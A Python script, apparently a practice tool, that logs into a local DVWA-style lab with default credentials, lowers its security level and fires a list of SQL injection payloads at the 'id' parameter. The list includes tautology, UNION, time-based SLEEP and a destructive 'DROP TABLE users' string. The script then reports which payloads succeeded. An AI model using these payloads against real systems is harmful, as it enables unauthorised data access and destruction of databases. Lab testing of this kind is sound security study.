import requests
import time
import logging
import json
import csv
from tqdm import tqdm
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

# ─── Logging Setup ───────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler("sql_scanner.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ─── Config ──────────────────────────────────────────────────

TARGET_URL = "http://localhost:8080/vulnerabilities/sqli/"
LOGIN_URL  = "http://localhost:8080/login.php"
PARAM      = "id"
MAX_WORKERS = 3        # Concurrency — same time- 3 requests
RATE_LIMIT  = 0.5      # Each request — delay (seconds)

PAYLOADS = [
    "1' OR '1'='1",
    "1' OR '1'='1' --",
    "1' OR '1'='1' #",
    "1 UNION SELECT 1,2 --",
    "' UNION SELECT NULL, NULL --",
    "admin' --",
    "1' AND SLEEP(3) --",
    "1' OR '1'='1' AND '1'='1",
    "1\"; DROP TABLE users; --"
]

# ─── Login & Session ─────────────────────────────────────────

def create_session():
    session = requests.Session()
    logger.info("Getting CSRF token from login page...")
    login_page = session.get(LOGIN_URL)
    soup = BeautifulSoup(login_page.text, "html.parser")
    token = soup.find("input", {"name": "user_token"})
    user_token = token["value"] if token else ""

    login_data = {
        "username": "admin",
        "password": "password",
        "Login": "Login",
        "user_token": user_token
    }
    session.post(LOGIN_URL, data=login_data)

    check = session.get("http://localhost:8080/index.php")
    if "logout" not in check.text.lower():
        logger.error("Login FAILED!")
        exit()
    logger.info("Login SUCCESS!")

    # Set security LOW
    sec_page = session.get("http://localhost:8080/security.php")
    sec_soup = BeautifulSoup(sec_page.text, "html.parser")
    sec_token = sec_soup.find("input", {"name": "user_token"})
    sec_token_val = sec_token["value"] if sec_token else ""
    session.post("http://localhost:8080/security.php", data={
        "security": "low",
        "seclev_submit": "Submit",
        "user_token": sec_token_val
    })
    logger.info("Security level set to LOW")
    return session

# ─── Test Single Payload ──────────────────────────────────────

def test_payload(session, payload):
    time.sleep(RATE_LIMIT)  # Rate limiting
    try:
        params = {PARAM: payload, "Submit": "Submit"}
        start = time.time()
        response = session.get(TARGET_URL, params=params, timeout=10)
        duration = round(time.time() - start, 2)
        text = response.text.lower()

        is_vulnerable = False
        reason = ""

        if "first name" in text and "surname" in text:
            is_vulnerable = True
            reason = "SQL result leaked (First Name/Surname visible)"
        elif duration > 2.5 and "sleep" in payload.lower():
            is_vulnerable = True
            reason = f"Time-based SQLi (response took {duration}s)"
        elif "error in your sql syntax" in text:
            is_vulnerable = True
            reason = "SQL syntax error exposed"
        elif "you have an error" in text or "mysql_fetch" in text:
            is_vulnerable = True
            reason = "MySQL error leaked"

        status = "VULNERABLE" if is_vulnerable else "SAFE"
        logger.info(f"[{status}] Payload: {payload[:40]} | Time: {duration}s")

        return {
            "payload": payload,
            "status": status,
            "reason": reason if is_vulnerable else "No vulnerability detected",
            "response_time": duration,
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }

    except requests.exceptions.Timeout:
        logger.warning(f"[TIMEOUT] Payload: {payload[:40]}")
        return {"payload": payload, "status": "TIMEOUT", "reason": "Request timed out",
                "response_time": 10, "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
    except Exception as e:
        logger.error(f"[ERROR] Payload: {payload[:30]} → {e}")
        return {"payload": payload, "status": "ERROR", "reason": str(e),
                "response_time": 0, "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}

# ─── Save Reports ─────────────────────────────────────────────

def save_json_report(results):
    filename = f"report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(filename, "w") as f:
        json.dump(results, f, indent=4)
    logger.info(f"JSON report saved: {filename}")
    return filename

def save_csv_report(results):
    filename = f"report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
    with open(filename, "w", newline="") as f:
        writer = csv.DictWriter(f, fieldnames=["payload","status","reason","response_time","timestamp"])
        writer.writeheader()
        writer.writerows(results)
    logger.info(f"CSV report saved: {filename}")
    return filename

# ─── Main ─────────────────────────────────────────────────────

def main():
    logger.info("=" * 50)
    logger.info("SQL Injection Scanner Started")
    logger.info("=" * 50)

    session = create_session()
    results = []

    # Concurrent scanning

    logger.info(f"Starting scan with {MAX_WORKERS} concurrent workers...\n")
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = {executor.submit(test_payload, session, p): p for p in PAYLOADS}
        for future in tqdm(as_completed(futures), total=len(PAYLOADS), desc="Scanning"):
            result = future.result()
            results.append(result)

    # Summary

    vulnerable = [r for r in results if r["status"] == "VULNERABLE"]
    safe       = [r for r in results if r["status"] == "SAFE"]

    print(f"\n{'='*50}")
    print(f"Scan Complete!")
    print(f"  Vulnerable : {len(vulnerable)}")
    print(f"  Safe       : {len(safe)}")
    print(f"  Total      : {len(results)}")

    if vulnerable:
        print("\nVulnerable Payloads:")
        for r in vulnerable:
            print(f"  → {r['payload']}")
            print(f"     Reason: {r['reason']}")

    # Save reports

    save_json_report(results)
    save_csv_report(results)
    print("\nReports saved! Check .json, .csv, and sql_scanner.log files.")

if __name__ == "__main__":
    main()
    